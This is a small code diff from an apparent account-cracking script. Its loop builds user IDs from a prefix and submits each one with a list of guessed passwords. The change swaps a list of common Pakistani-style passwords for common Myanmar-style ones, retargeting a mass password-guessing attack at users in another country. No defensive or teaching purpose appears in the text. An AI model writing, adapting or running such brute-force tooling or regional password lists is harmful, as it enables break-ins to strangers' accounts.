@@ -184,7 +184,7 @@ def pak():
 		linex()
 		for psx in user:
 			ids = code+psx
-			passlist = [psx,ids,'khankhan','khan123','malik123','baloch123','kingkhan','khan12345','malik1234','khanbaba','pak123','pak786','malik1122','khan1122']
+			passlist = [psx,ids,'kyawkyaw','myanmar','aungaung','chitchit','chitlay','zawzaw']
 			REHAN.submit(rd1,ids,passlist)
 	print('\033[1;37m')
 	linex()
